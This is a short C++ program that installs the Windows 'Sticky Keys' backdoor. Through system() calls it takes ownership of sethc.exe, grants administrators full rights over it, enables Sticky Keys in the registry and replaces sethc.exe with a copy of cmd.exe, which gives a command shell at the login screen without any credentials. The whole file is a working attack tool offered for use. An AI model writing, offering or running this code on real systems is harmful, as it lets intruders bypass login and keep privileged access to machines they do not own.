#include <iostream>
#include <cstdlib>

int priv_esc() {
    //grants administrative permissions to sethc.exe (Sticky Keys)
    system("takeown /f C:\\Windows\\System32\\sethc.exe");
    system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");
    return 0;
}

int sticky_keys() {
    //makes sure that sticky keys is turned on
    system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");
    
    //replaces sethc.exe with cmd.exe
    system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
    return 0;
}

int main(){
    priv_esc();
    sticky_keys();
    return 0;
}